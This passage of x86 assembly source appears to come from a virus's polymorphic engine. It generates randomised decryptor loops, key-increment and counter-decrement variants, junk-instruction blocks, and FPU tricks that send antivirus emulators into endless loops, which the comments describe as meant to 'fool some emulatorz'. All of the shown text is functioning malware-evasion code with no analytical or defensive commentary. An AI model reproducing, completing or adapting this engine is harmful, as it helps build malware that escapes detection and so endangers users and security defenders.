                call  ciOpRMReg
dd_not_save_reg:
                ret

;iProcDecData    endp

; increment key
iProcIncKey:
                mov   edx, [ebp+KeyIncrement-idelta] ; load key increment
                call  iGetJunkReg                    ; get random junk reg
                xchg  eax, ecx
                mov   ebx, ecx
                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                mov   bh, OPTYPE_ADD              ; first assume ADD
                cmp   al, KEY_DEC                 ; check if decrement key
                jnz   pik_not_sub                 ; nope, ADD
                mov   bh, OPTYPE_SUB              ; yes, SUB
pik_not_sub:    ja    pik_rotate                  ; > KEY_DEC: rotate!

                call  rnd32
                test  al, 0x01
                jz    pik_direct                  ; don't load reg

                push  ebx
                call  gLoadReg            ; move key increment into reg
                pop   ebx
                call  iBlockJunkAR
                xor   bl, MOD_REG
                mov   cl, [ebp+kreg-idelta]      ; get key reg
                xor   ecx, 0xFFFFFF00 ^ MOD_REG
                push  0x02
                call  rnd32r
                test  eax, eax
                jz    pik_blah
                xchg  bl, cl
pik_blah:
                mov   ah, al
                mov   al, OPSIZE_32
                jmp   ciOpRMReg                  ; create instruction
pik_direct:
                mov   al, OPSIZE_32
                mov   bl, bh
                mov   cl, [ebp+kreg-idelta]
                or    ecx, 0xFFFFFF00 ^ MOD_REG

                jmp   ciOpRMImm

pik_rotate:     xor   bl, bl                     ; ROL shift
                cmp   al, KEY_ROR
                jnz   pik_not_ror
                inc   ebx                        ; ROR shift

pik_not_ror:    mov   ah, dl
                and   ah, 0x1F
                mov   bh, SHIFT_IMM
                mov   al, OPSIZE_32
                mov   cl, [ebp+kreg-idelta]
                xor   cl, MOD_REG
                call  ciShiftRM
                ret
;iProcIncKey     endp
; increment pointer by 4
iProcIncPtr:
                push  0x04                       ; we have 4 methods
                call  rnd32r                    ; to do so
                mov   cl, [ebp+preg-idelta]
                xor   cl, MOD_REG               ; pointer reg, of course
                push  0x04
                pop   edx                       ; mov edx, 4 (optimized :P)
                test  al, al
                jnz   pip_not_add
                mov   bl, OPTYPE_ADD
pip_not_add:    cmp   al, 0x01
                jnz   pip_not_sub
                neg   edx
                mov   bl, OPTYPE_SUB
pip_not_sub:    cmp   al, 0x02
                jnz   pip_not_adc
                mov   bl, OPTYPE_ADC
                dec   edx
                mov   byte [edi], SET_CRY
                inc   edi
pip_not_adc:    cmp   al, 0x03
                jnz   pip_not_lea

                ; generate lea preg, [preg + 0x04]
                mov   byte [edi], LOAD_EA
                inc   edi
                and   cl, REG_RND - 1
                mov   bl, cl
                push  esi
                xchg  edx, esi
                xor   ch, ch
                call  ciCreateOperand
                pop   esi
                ret
pip_not_lea:    mov   al, OPSIZE_32
                jmp   ciOpRMImm
                ret
;iProcIncPtr     endp
; decrement counter
iProcDecCnt:
                push  0x05
                call  rnd32r
                mov   cl, [ebp+creg-idelta]
                or    cl, MOD_REG
                xor   edx, edx
                test  al, al
                jnz   pdc_not_dec

                ; generate DEC creg
                mov   al, DEC_REG
                or    al, [ebp+creg-idelta]
                stosb
                ret
pdc_not_dec:    cmp   al, 0x01
                jnz   pdc_not_add_FF

                ; generate ADD creg, -1
                mov   bl, OPTYPE_ADD
                dec   edx
pdc_not_add_FF: cmp   al, 0x02
                jnz   pdc_not_sbb

                ; generate STC, SBB creg, 0
                mov   byte [edi], SET_CRY
                inc   edi
                mov   bl, OPTYPE_SBB

pdc_not_sbb:    cmp   al, 0x03
                jnz   pdc_not_lea
                ; generate LEA creg, [creg - 1]

                mov   byte [edi], LOAD_EA
                inc   edi
                and   cl, REG_RND - 1
                mov   bl, cl
                push  esi
                xor   esi, esi
                dec   esi
                xor   ch, ch
                call  ciCreateOperand
                pop   esi
                ret

pdc_not_lea:    cmp   al, 0x04
                jnz   pdc_not_sub
                ; generate SUB creg, 1
                mov   bl, OPTYPE_SUB
                inc   edx

pdc_not_sub:    mov   al, OPSIZE_32
                jmp   ciOpRMImm
;iProcDecCnt     endp

; fool some emulatorz
iProcFPUFool:

                ; initialize FPU
                mov   eax, FPU_WAIT | (FPU_INIT * 0x100) | 'X' * 0x1000000
                stosd
                dec   edi

                ; choose random address to store result
                call  iGetWrMem
                push  GF_METHCNT                ; choose between 4 methods
                call  rnd32r
                push  eax
                inc   eax
                mov   edx, eax

                ; store initial value in memory
                mov   al, OPSIZE_32
                mov   bl, OPTYPE_MOV
                call  ciOpRMImm

                call  iRndRegJ

                ; load dword from address into fpu register
                call  rnd32
                and   al, FPU_WORD_LDST
                or    al, FPU_INT_LDST
                mov   bl, FPU_LOAD
                stosb
                call  ciCreateOperand

                ; calculate address of method and execute it!
                pop   eax
                push  eax
                mov   ebx, [ebp+gf_methods-idelta+4*eax]
                add   ebx, ebp
                call  ebx

                ; write back dword from st(0)
                call  iGetWrMem
                call  rnd32
                and   al, FPU_WORD_LDST ^ FPU_INT_LDST
                xor   al, FPU_INT_LDST
                mov   bl, FPU_STORE
                stosb
                call  ciCreateOperand
                call  iRndRegJ

                ; check returned value of FPU instructions.

                pop   eax
                push  edi            ; label1 in ECX (see below)
                movzx edx, byte [ebp+gf_rslt_table-idelta+eax]
                push  0x03
                call  rnd32r
                add   al, OPTYPE_SUB            ; SUB, CMP or XOR
                xchg  eax, ebx
                xor   al, al
                push  edi
                call  ciOpRMImm

                ; if not equal, generate endless loop (fuck some emulatorz)

                ; generate JZ or JNZ
                pop   ebx
                pop   ecx
                mov   al, ah              ; get another random byte
                test  al, 0x40
                jnz   gf_as1              ; not zero, jump after junk
                xchg  ecx, ebx
gf_as1:

                call  rnd32               ; random dword
                and   al, 0x01
                jz    gf_el1              ; zero, generate JZ

                ;  jump back before compare instruction or afta
                ;
                ;  label1:       <access mem junk>
                ;  label2:       CMP/SUB/XOR
                ;                JNZ  label2/label3

                xchg  eax, ecx
                mov   byte [edi], JMPC_SHORT ^ COND_NZ
                inc   edi
                sub   eax, edi            ; calculate relative offset
                dec   eax                 ; we need to dec rel
                stosb                     ; write relative jmp offset
                ret

gf_el1:
                ;
                ;                JZ   label2/label3
                ;  label1:       <junk>
                ;                JMP  label1
                ;  label2:       <junk>
                ;  label3:
                ;
                xchg  eax, ecx
                mov   byte [edi], JMPC_SHORT ^ COND_Z
                inc   edi
                push  edi
                inc   edi
                call  iBlockJunk
                mov   byte [edi], JMP_SHORT
                inc   edi
                sub   eax, edi
                dec   eax
                stosb
                push  edi
                call  iBlockJunk
                mov   ebx, edi
                pop   ecx
                mov   al, ah              ; get another random byte
                test  al, 0x20
                jnz   gf_as2
                xchg  ecx, ebx
gf_as2:         xchg  eax, ecx
                pop   eax
                neg   eax
                lea   ebx, [edi+eax-01]
                neg   eax
                mov   [eax], bl

gf_xit:
                ret

gf_rslt_table   db    0x03, 0x07, 0x02, 0x00

gf_meth1:       call  rnd32
                and   al, 0x01
                jz    gf_meth11
                mov   ax, FPU_LDPI
                stosw
                call  iBlockJunk
                mov   al, FPU_WORD_OP
                stosb
                mov   bl, FPU_MULP
gf_meth1e:      mov   cl, REG_ST1 | MOD_REG
                jmp   ciCreateOperand

gf_meth11:      mov   ax, FPU_LDLG2
                stosw
                call  iBlockJunk
                mov   al, FPU_WORD_OP
                stosb
                mov   bl, FPU_DIVP
                jmp   gf_meth1e

gf_meth2:       mov   ax, FPU_LDL2T
                stosw
                call  iBlockJunk
                mov   al, FPU_DWORD_OP
                stosb
                mov   bl, FPU_MUL
                mov   cl, REG_ST1 | MOD_REG
                jmp   ciCreateOperand


gf_meth3:       mov   ax, FPU_LDLN2
                stosw
                call  iBlockJunk
                mov   ax, FPU_SQRT
                stosw
                mov   al, FPU_QWORD_OP
                stosb
                mov   bl, FPU_MUL
                mov   cl, REG_ST1 | MOD_REG
                call  ciCreateOperand
                mov   ax, FPU_DWORD_LDST | (0x100 * (MOD_REG ^ 0x09))
                stosw
                ret

gf_methods:        
                dd     gf_meth1-idelta
                dd     gf_meth2-idelta
                dd     gf_meth3-idelta
%define GF_METHCNT       3
;iProcFPUFool    endp
; main procedure: generate 1-3 different junk blockz
iProcJunk:
                push  ecx              ; preserve counter
                push  0x03              ; get random number between 0 and 4
                call  rnd32r
                inc   eax              ; add 1 (1 - 3)
                xchg  eax, ecx         ; load into counter
                call  iBlockJunk       ; generate junk blocks
                loop  $ - 0x05
                pop   ecx              ; restore counter
                ret
;iProcJunk       endp
; main procedure: generate 1 junk block
iBlockJunk:
                mov   bl, 0x08
iBlockJunkAR:                            ; avoid register in ebx
                test  byte [ebp+nojunk-idelta], 0x0FF
                jz    bj_sueder
                ret
bj_sueder:
                pushad
                push  BJ_BLOCKCNT        ; choose between multiple methods
                call  rnd32r
                mov   edx, [ebp+bj_blockz-idelta+4*eax] ; get address of
                add   edx, ebp           ; method procedure & relocate
bj_nxtr:        call  iGetJunkReg        ; get a junk reg
                cmp   al, bl             ; test if we shouldn't touch it
                je    bj_nxtr            ; yes, get another junk reg
                xchg  ebx, eax           ; junk reg in EAX
                call  edx                ; execute method
                mov   [esp], edi
                popad
                ret

                ; junk block 1:
                ; 1. <compare/sub register/memory with constant>
                ; 2. <conditional jump to 4.>
                ; 3. <2 - 4 junk instructions>
                ; 4.
bj_block1:      push  ebx                ; save register 4 l8er use
                mov   dh, bl
                mov   bl, OPTYPE_SUB
                call  rnd32              ; get random number
                and   al, 0x02            ; 0/2
                add   bl, al             ; OPTYPE_SUB + 2 = OPTYPE_CMP
                call  rnd32
                and   al, 0x01
                mov   dl, al             ; dl = 0/1 (reg/junk)
                test  dl, dl
                jz    bj_b1_nreg1
                call  rnd32
                and   al, REG_EDI        ; 00000xxx random reg
                xor   al, MOD_REG        ; 11000xxx set reg bits
                xchg  eax, ecx
                jmp   bj_b1_nmem1
bj_b1_nreg1:    call  iGetMemory         ; get readable memory
bj_b1_nmem1:    cmp   bl, OPTYPE_SUB     ; if not SUB, get read only
                jnz   bj_b1_nro          ; register or memory
                test  dl, dl
                jz    bj_b1_nreg2
                mov   cl, dh             ; writeable register
                xor   ecx, 0xFFFFFF00 ^ MOD_REG
                jmp   bj_b1_nro
bj_b1_nreg2:    call  iGetWrMem
bj_b1_nro:      mov   al, bl
                xor   al, MOD_REG
                test  al, MOD_REG
                jz    bj_b1_regalign
                call  iOpSizeMem
                jmp   bj_b1_blah
bj_b1_regalign: call  iOpSizeReg
bj_b1_blah:     push  eax
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 0x01
                jz    bj_b1_akldf
                movsx edx, dl
bj_b1_akldf:    pop   eax
                call  ciOpRMImm
                pop   ebx
                call  rnd32
                and   al, 0x0F            ; get random conditional jump type
                xor   al, JMPC_SHORT     ; make jump opcode
                stosb                    ; store it
                push  edi                ; push address of immediate
                stosb                    ; store placeholder byte
                call  iRndJunk           ; make some junk
                pop   eax
                not   eax
                lea   ebx, [edi+eax]     ; relative address
                not   eax
                mov   [eax], bl          ; store relative jump address
                ret
                ; junk block 2:
                ; 1. <push junk>
                ; 2. <2 - 4 junk instructions>
                ; 3. <pop junk>
bj_block2:      call  iPushJunk
                call  iRndJunk           ; make some junk
                jmp   iPopJunk

bj_block3:      call  rnd32              ; generate STC/CLC/STD/CLD
                and   al, 0x05
                xor   al, 0x0F8
                stosb
                jmp   iRndJunk

bj_blockz:         
                dd     bj_block1 - idelta
                dd     bj_block2 - idelta
                dd     bj_block3 - idelta
                dd     iRndJunk - idelta
                dd     iRndJunk - idelta
%define BJ_BLOCKCNT      0x05
;iBlockJunk      endp

                ; writes two to four random junk instruction (reg or mem)
iRndJunk:
                pushad
                push  0x03
                call  rnd32r
                inc   eax
                inc   eax
                xchg  eax, ecx
rndj_loop:      push  JUNKGEN_CNT
                call  rnd32r
                mov   eax, [ebp+JunkGen-idelta+4*eax]
                add   eax, ebp
                push  ecx
                push  ebx
                call  eax
                pop   ebx
                pop   ecx
                loop  rndj_loop
                mov   [esp], edi
                popad
                ret
;iRndJunk        endp
; generates one junk instruction with the register in ebx (the register
; isn't overwritten some times)
; ebx = register
iRegJunk:
                push  RJ_METHCNT
                call  rnd32r
                mov   ecx, [ebp+rj_methods-idelta+4*eax]
                add   ecx, ebp
                call  iOpSizeReg
                jmp   ecx

                ; method 1: immediate operation on register
rj_meth1:       push  eax
                mov   ecx, ebx
                xor   ecx, 0xFFFFFF00 ^ MOD_REG
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m1_nmov
                mov   al, OPTYPE_MOV
rj_m1_nmov:
                xchg  eax, ebx
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 0x0C
                jz    rj_m1_nsx
                movsx edx, dl
rj_m1_nsx:      pop   eax
rj_m1_nrc:      jmp   ciOpRMImm

                ; method 2: operation with mem on register
rj_meth2:       push  eax
                call  iGetMemory
                push  OPTYPE_MOV + 3    ; we don't want to XCHG
                call  rnd32r            ; get random operation type
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m2_nmov
                mov   al, OPTYPE_MOV
rj_m2_nmov:
                mov   bh, al
                pop   eax
                mov   ah, REG_MEM
                jmp   ciOpRMReg

                ; method 3: operation with reg on register
rj_meth3:
                push  eax
rj_m3_asd:      call  rnd32
                and   al, REG_EDI
                cmp   al, bl
                je    rj_m3_asd
                xor   al, MOD_REG
                xor   bl, MOD_REG
                xchg  eax, ecx
                call  rnd32
                and   al, 0x01
                jnz   rj_m3_nxchg
                xchg  bl, cl
rj_m3_nxchg:    xchg  eax, edx
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m3_nmov
                mov   al, OPTYPE_MOV
rj_m3_nmov:     mov   bh, al
                pop   eax
                mov   ah, dl
                jmp   ciOpRMReg

                ; method 4: shift register
rj_meth4:       xchg  eax, ebx
                or    al, MOD_REG
                xchg  eax, ecx
                push  ebx
                push  RND_SHIFT
                call  rnd32r
                xchg  eax, ebx
                push  SHIFT_RND
                call  rnd32r
                mov   bh, al
                call  rnd32
                and   al, 0x1F
                xchg  eax, edx
                pop   eax
                cmp   al, OPSIZE_16
                jne   rj_m4_blah1
                and   dl, 0x0F
rj_m4_blah1:    cmp   al, OPSIZE_8
                jne   rj_m4_blah2
                and   dl, 0x07
rj_m4_blah2:
                mov   ah, dl
                jmp   ciShiftRM

                ; method 5: movzx/movsx register, reg
rj_meth5:       test  al, al
                jnz   rj_m5_ok
                inc   eax
                and   bl, ~0x04
rj_m5_ok:       mov   dl, MOVX_WORD ^ MOVX_SX
                test  al, 0x02
                jz    rj_m5_nprefix
                mov   byte [edi], OPERAND_SIZE
                inc   edi
                mov   dl, MOVX_SX
rj_m5_nprefix:  mov   byte [edi], ESC_2BYTE
                inc   edi
                call  rnd32
                and   al, dl
                xor   al, MOVX
                stosb
                call  rnd32
                and   al, REG_EDI
                shl   ebx, 0x03
                xor   eax, ebx
                xor   al, MOD_REG
                stosb
                ret

                ; method 6: inc/dec register
rj_meth6:       push  eax
                call  rnd32
                and   al, 0x01
                xchg  eax, edx          ; BL = 0 [INC] BL = 1 [DEC]
                pop   eax
                test  al, al
                jnz   rj_m6_n8
                mov   byte [edi], INCDEC_GROUP
                inc   edi
                xchg  eax, edx
                shl   eax, 0x03
                xor   al, MOD_REG
                xor   al, bl
                stosb
                ret

rj_m6_n8:       test  al, 0x02
                jz    rj_m6_noprefix
                mov   byte [edi], OPERAND_SIZE
                inc   edi
rj_m6_noprefix: xchg  eax, edx
                shl   eax, 0x03
                xor   al, INC_REG
                xor   al, bl
                stosb
                ret

rj_methods:        
                dd     rj_meth1 - idelta
                dd     rj_meth2 - idelta
                dd     rj_meth3 - idelta
                dd     rj_meth4 - idelta
                dd     rj_meth5 - idelta
                dd     rj_meth6 - idelta
%define RJ_METHCNT       0x06
;iRegJunk        endp

; write 2 - 4 register junk instructions
iRndRegJ:
                pushad
                push  0x03
                call  rnd32r
                inc   eax
                inc   eax
                xchg  eax, ecx
                call  iGetJunkReg
                xchg  eax, ebx
irrj_loop:      push  ecx
                push  ebx
                call  iRegJunk
                pop   ebx
                pop   ecx
                loop  irrj_loop
                mov   [esp], edi
                popad
                ret
;iRndRegJ        endp

; memory junk generator
iMemJunk:
                push  MJ_METHCNT
                call  rnd32r
                mov   edx, [ebp+mj_methods-idelta+4*eax]
                add   edx, ebp
                push  OPSIZE_16 + 1
                call  rnd32r
                call  iGetWrMem
                jmp   edx

                ; immediate operation on memory
mj_meth1:       push  eax
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    mj_m1_nmov
                mov   al, OPTYPE_MOV
mj_m1_nmov:     xchg  eax, ebx
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 0x0C
                jz    mj_m1_nsx
                movsx edx, dl
mj_m1_nsx:      pop   eax
mj_m1_nrc:      jmp   ciOpRMImm

                ; register operation on memory

mj_meth2:       push  eax
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    mj_m2_nmov
                mov   al, OPTYPE_MOV
mj_m2_nmov:     mov   bh, al

                call  rnd32
                test  ah, 0x01
                jz    mj_m2_rndreg
                and   al, REG_EDI
                mov   bl, al
mj_m2_rndreg:   pop   eax
                xor   ah, ah    ; MEM_REG
                jmp   ciOpRMReg

                ; shift operation on memory
mj_meth3:       push  eax
                push  RND_SHIFT
                call  rnd32r
                xchg  ebx, eax
                push  SHIFT_RND
                call  rnd32r
                mov   bh, al
                call  rnd32
                xchg  eax, edx
                pop   eax
                mov   ah, dl
                jmp   ciShiftRM

mj_methods:        
                dd     mj_meth1 - idelta
                dd     mj_meth2 - idelta
                dd     mj_meth3 - idelta
%define MJ_METHCNT       0x03
;iMemJunk        endp
; input: bl = register
; output: al = operand size, bl = register
iOpSizeReg:
                push  OPSIZE_16 + 1
                call  rnd32r
                test  al, al
                jnz   cr_nop
                cmp   bl, REG_ESP
                jnb   iOpSizeReg
                push  eax
                call  rnd32
                and   al, 0x04
                xor   bl, al
                pop   eax
cr_nop:         ret
;iOpSizeReg      endp
; input: cx, esi = memory
; output: al = operand size, cx, esi = memory
iOpSizeMem:
                push  OPSIZE_16 + 1
                call  rnd32r
                ret
;iOpSizeMem      endp

; gets random register, parameter or junk memory operand
iGetMemory:
                push  eax
gm_rep:         xor   eax, eax
                mov   al, GM_METHCNT2
                cmp   byte [ebp+CurrentProc-idelta], DECRYPT_DATA
                jb    gm_push
                inc   eax
                inc   eax
gm_push:        sub   al, [ebp+InLoop-idelta]
                push  eax
                call  rnd32r
                add   al, [ebp+InLoop-idelta]
                mov   eax, [ebp+gm_methods-idelta+4*eax]
                add   eax, ebp
                call  eax
                pop   eax
                ret

                ; get random parameter
gm_meth1:       movzx eax, byte [ebp+CurrentProc-idelta]
                mov   al, [ebp+ProcParameters-idelta+eax] ; parameter count
                test  eax, eax
                jz    gm_m1_ebp    ; if no parameter, don't use this method
                push  eax
                call  rnd32r       ; choose random parameter
                shl   eax, 0x02     ; scale to dword
                add   al, 0x08      ; first dword is return address
                mov   esi, eax     ; the displacement
                mov   cx, REG_EBP  ; relative to EBP
                ret
gm_m1_ebp:      mov   cl, REG_EBP ^ MOD_REG
                ret

                ; get random junk mem
gm_meth2:       mov   eax, [ebp+JunkSpSize-idelta] ; access a random dword
                shl   eax, 0x02
                dec   eax
                dec   eax
                dec   eax
                push  eax
                call  rnd32r                      ; from junk memory
                add   eax, [ebp+JunkSpRVA-idelta] ; add start rva
                xchg  eax, esi
                mov   cx, MOD_DIRECT              ; return a direct address
                ret

                ; get random encrypted data
gm_meth3:       mov   eax, [ebp+CryptSize-idelta]
                shl   eax, 0x02
                dec   eax
                dec   eax
                dec   eax
                push  eax
                call  rnd32r
                add   eax, [ebp+DecryptRVA-idelta]
                xchg  eax, esi
                mov   cx, MOD_DIRECT
                ret

                ; get encrypted data (RVA + 1/2/4*counter)
gm_meth4:       mov   esi, [ebp+DecryptRVA-idelta]
                push  0x03                   ; scaling factor 1, 2 or 4
                call  rnd32r
                mov   ecx, eax
                push  edx
                xor   edx, edx
                inc   edx
                shl   edx, cl
                sub   esi, edx
                pop   edx
                shl   eax, 0x03
                xor   al, [ebp+creg-idelta]
                mov   ch, al
                mov   cl, MOD_DIRECT
                ret

                ; get current encrypted dword
gm_meth5:       movsx cx, byte [ebp+preg-idelta]  ; use [preg] without
                xor   esi, esi                        ; displacement
                ret

gm_methods:        
                dd     gm_meth1 - idelta
                dd     gm_meth2 - idelta
%define GM_METHCNT3      0x02
                dd     gm_meth3 - idelta
%define GM_METHCNT2      0x03
                dd     gm_meth4 - idelta
                dd     gm_meth5 - idelta
%define GM_METHCNT1      0x05
;iGetMemory      endp

iGetWrMem:
                push  eax
                push  GM_METHCNT3 - 1
                call  rnd32r
                mov   eax, [ebp+gm_methods-idelta+4+4*eax]
                add   eax, ebp
                call  eax
                pop   eax
                ret
;iGetWrMem       endp


iGetPar:
                ret
;iGetPar         endp

; common junk procedures

iGetJunkReg:
                push  0x03
                call  rnd32r
                movzx eax, byte [ebp+junkreg1-idelta+eax]
                ret
;iGetJunkReg     endp

iPushJunk:
                pushad
                push  PP_METHCNT                ; random method to push
                call  rnd32r                    ; a parameter
                mov   eax, [ebp+pp_methods-idelta+4*eax]
                add   eax, ebp
                call  eax                       ; call da method
                mov   [esp], edi
                popad
                ret

                ; push 8-bit immediate sign 'xtended to 32-bit
pp_meth1:       mov   al, PUSH_IMM_SX
                stosb
                call  rnd32
                stosb
                ret

                ; push 32-bit immediate
pp_meth2:       mov   al, PUSH_IMM
                stosb
                call  rnd32
                xchg  eax, edx
                call  rnd32
                and   eax, edx
                stosd
                ret

                ; push register
pp_meth4:       call  rnd32
                and   al, REG_EDI
                xor   al, PUSH_REG
                stosb
                ret

                ; push memory
pp_meth3:       call  iGetMemory
                mov   al, OP_GROUP5
                stosb
                mov   bl, P_PUSH
                jmp   ciCreateOperand


pp_methods:        
                dd     pp_meth1 - idelta
                dd     pp_meth2 - idelta
                dd     pp_meth3 - idelta
                dd     pp_meth4 - idelta
                dd     pp_meth4 - idelta
%define PP_METHCNT       0x05
;iPushJunk       endp

iPopJunk:
                call  rnd32
                test  al, 0x01
                jz    pj_asdfklj
                mov   al, POP_REG
                xor   eax, ebx
                stosb
                ret

pj_asdfklj:     test  al, 0x02
                jz    pj_blahblah
                call  iGetWrMem
                mov   al, POP_MEM
                stosb
                xor   bl, bl
                jmp   ciCreateOperand

pj_blahblah:    push  0x04
                pop   edx
                xor   bl, bl
                test  al, 0x04
                jz    pj_sueder
                add   bl, OPTYPE_SUB
                neg   edx
pj_sueder:      mov   al, OPSIZE_32
                mov   cl, REG_ESP ^ MOD_REG
                xor   ch, ch
                call  ciOpRMImm
                ret
;iPopJunk        endp
; returns random dword (0..4294967295)
rnd32:          ; [no parameterz]
                push  ecx
                push  edx
                mov   eax, [ebp+RandomSeed-idelta] ; load random seed
                mov   ecx, eax
                mov   edx, eax
                not   ecx
                and   ecx, 0x03          ; loop 8-64 times
                inc   ecx
                shl   ecx, 0x03
rnd32_loop:     push  ecx
                mov   ecx, edx
                ror   eax, cl
                neg   eax
                rol   edx, cl
                dec   edx
                pop   ecx
rnd32_blah:     loop  rnd32_loop
                xor   eax, edx
                mov   [ebp+RandomSeed-idelta], eax ; write back random seed
                pop   edx
                pop   ecx
                ret
;rnd32           endp

; returns random dword (0..[esp+4])
rnd32r:         ; [range]
                push  ecx
                push  edx
                mov   ecx, [esp+2*4+4]
                call  rnd32
                xor   edx, edx
                div   ecx
                xchg  eax, edx
                pop   edx
                pop   ecx
                ret   0x04
;rnd32r          endp

; 'xchanges n bytes from address ESI (n has to be pushed)
MixBytes:       ; [count] [esi = ptr]
                pushad                    ; preserve all registers
                mov   ebx, [esp+PUSHAD_SIZE+0x04]
                mov   ecx, ebx
                shl   ecx, 0x01            ; loop counter (2 * # of bytes)

xb_loop:        push  ebx                 ; number of bytes
                call  rnd32r              ; get first byte offset
                xchg  eax, edx
                push  ebx
                call  rnd32r              ; get second byte offset
                push  ebx                 ; preserve number
                mov   bl, [esi+eax]
                xchg  [esi+edx], bl       ; exchange bytes
                mov   [esi+eax], bl
                pop   ebx
                loop  xb_loop
                popad
                ret   0x04
;MixBytes        endp

; writes 1 to 4 random bytes
WriteJunk:
                push  eax
                push  ecx
                push  0x04                 ; get random value 0..3
                call  rnd32r
                inc   eax                 ; +1 (1..4)
                xchg  ecx, eax            ; load into counter
wj_loop:        call  rnd32               ; get a random byte
                stosb                     ; store it
                loop  wj_loop
                pop   ecx
                pop   eax
                ret
;WriteJunk       endp

; returns reg if it is a junk reg, otherwise -1
iIsJReg:
                mov   eax, [esp+0x04]
                cmp   [ebp+junkreg1-idelta], al
                je    is_junkreg
                cmp   [ebp+junkreg2-idelta], al
                je    is_junkreg
                cmp   [ebp+junkreg3-idelta], al
                je    is_junkreg
                xor   eax, eax
                dec   eax
is_junkreg:     ret   0x04
;iIsJReg         endp

; generates TEST reg, reg/OR reg, reg/AND reg, reg
gCheckReg:
                ; generate MOD/RM byte with MOD_REG flag and twice the same
                ; register.
                pushad
                mov   al, bl
                xor   al, MOD_REG               ; use as register
                mov   cl, al
                xchg  eax, ebx

                mov   bh, OPTYPE_OR
                push  0x05
                call  rnd32r                    ; get random value
                cmp   al, 0x03
                jae   gcr_zer0
                test  al, 0x02
                jz    gcr_and2
                mov   bh, OPTYPE_AND
gcr_and2:       test  al, 0x01
                jz    gcr_not_test
                mov   bh, OPTYPE_TEST
gcr_not_test:   call  rnd32
                and   ah, REG_MEM               ; random direction
                mov   al, OPSIZE_32
                call  ciOpRMReg
gcr_exit2:      mov   [esp], edi
                popad
                ret
gcr_zer0:       call  rnd32
                and   al, OPTYPE_CMP
                cmp   al, OPTYPE_ADC
                jb    gcrz_1
                cmp   al, OPTYPE_AND
                jna   gcr_zer0
gcrz_1:         xchg  eax, ebx
                xor   edx, edx
                mov   al, OPSIZE_32
                call  ciOpRMImm
                jmp   gcr_exit2
;gCheckReg       endp
; generates SUB reg, reg/XOR reg, reg/AND reg, 0
gClearReg:
                ; generate MOD/RM byte with MOD_REG flag and twice the same
                ; register.
                pushad
                mov   al, bl
                shl   al, 0x03                   ; shift to REG field
                xor   al, bl                    ; write RM field
                xor   al, MOD_REG               ; use as register
                xchg  eax, ebx

                ; generate either a SUB reg, reg or XOR reg, reg
                mov   cl, MATH_SUB | OPSIZE_32
                push  0x03
                call  rnd32r                    ; get random value
                test  al, 0x02
                jnz   gcr_and
                test  al, 0x01
                jz    gcr_not_sub
                mov   cl, MATH_XOR | OPSIZE_32
gcr_not_sub:    and   al, REG_MEM               ; random direction
                or    eax, ecx                  ; create opcode
                stosb                           ; store opcode
                xchg  eax, ebx                  ; MOD/RM byte
                stosb                           ; store
gcr_exit:       mov   [esp], edi
                popad
                ret
gcr_and:        xchg  eax, ebx
                and   al, MOD_REG ^ REG_EDI
                xchg  eax, ecx
                mov   bl, OPTYPE_AND
                mov   al, OPSIZE_32
                xor   edx, edx
                call  ciOpRMImm
                jmp   gcr_exit
;gClearReg       endp

; loads reg (EBX) with immediate value (EDX)
gLoadReg:
                mov   eax, edx
                shr   eax, 0x0F
                jnz   glr_notword

                push  0x03          ; the value is 0..32767,
                call  rnd32r       ; so we can choose
                sub   al, 0x01
                adc   al, 0x00
glr_shift_sx:   shl   eax, 0x03     ; MOVX_SX or MOVX_ZX

glr_word_val:   test  al, al
                jnz   glr_not_zx
                push  0x02
                call  rnd32r
                test  eax, eax
                jz    glr_not_zx

                call  gClearReg

                push  0x05                         ; ADD/OR/SUB/XOR
                call  rnd32r
                cmp   al, OPTYPE_OR
                jbe   glr_1
                add   al, OPTYPE_SUB - OPTYPE_ADC ; SUB/XOR
glr_1:          cmp   al, OPTYPE_SUB
                jne   glr_ns
                neg   edx
glr_ns:         cmp   al, OPTYPE_CMP
                jne   glr_asdf
                inc   eax
glr_asdf:       xchg  eax, ebx
                xor   al, MOD_REG
                xchg  eax, ecx
                mov   al, OPSIZE_16
                jmp   ciOpRMImm

glr_not_zx:     push  eax
                call  iGetJunkReg
                xchg  eax, ecx
                call  rnd32
                test  al, 0x03      ; chance of 1:4 to use same register
                jnz   glr_blah1
                mov   ecx, ebx
glr_blah1:      mov   al, OPSIZE_16
                push  ebx
                mov   bl, OPTYPE_MOV
                xor   ecx, 0x0FFFFFF00 ^ MOD_REG
                call  ciOpRMImm
                pop   ebx
                and   ecx, REG_EDI
                xchg  ecx, ebx
                call  iBlockJunkAR

                pop   eax
                mov   ah, ESC_2BYTE
                xor   al, MOVX ^ MOVX_WORD
                xchg  ah, al
                stosw
                xchg  ecx, ebx
                xor   ecx, 0xFFFFFF00 ^ MOD_REG
                jmp   ciCreateOperand

glr_notword:    inc   eax
                shr   eax, 0x11     ; if not zero, value is a negative word
                jnz   glr_shift_sx ; we must use MOVSX

                mov   eax, edx
                shr   eax, 0x10     ; if zero, only first 16 bits are used
                jz    glr_word_val ; we must use MOVZX

                push  GLR_METHCNT       ; choose between some methods
                call  rnd32r
                mov   eax, [ebp+glr_methods-idelta+eax*4] ; load method
                add   eax, ebp          ; relocate pointer to subroutine
                jmp   eax               ; jump to method.

                ; method 1: mov reg, imm
glr_meth1:      xchg  eax, ebx                  ; get register
                xor   al, MOV_REG_IMM32         ; add opcode
                stosb                           ; store opcode
                xchg  eax, edx                  ; get immediate
                stosd                           ; store immediate
                ret

                ; method 2: clear reg; add/or/sub/xor reg, imm
glr_meth2:      call  gClearReg                   ; clear the register
                push  0x04                         ; ADD/OR/SUB/XOR
                call  rnd32r
                cmp   al, OPTYPE_OR
                jbe   glr_m2_1
                add   al, OPTYPE_SUB - OPTYPE_ADC ; SUB/XOR
glr_m2_1:       cmp   al, OPTYPE_SUB
                jne   glr_m2_ns
                neg   edx
glr_m2_ns:      call  iBlockJunkAR
                xchg  eax, ebx
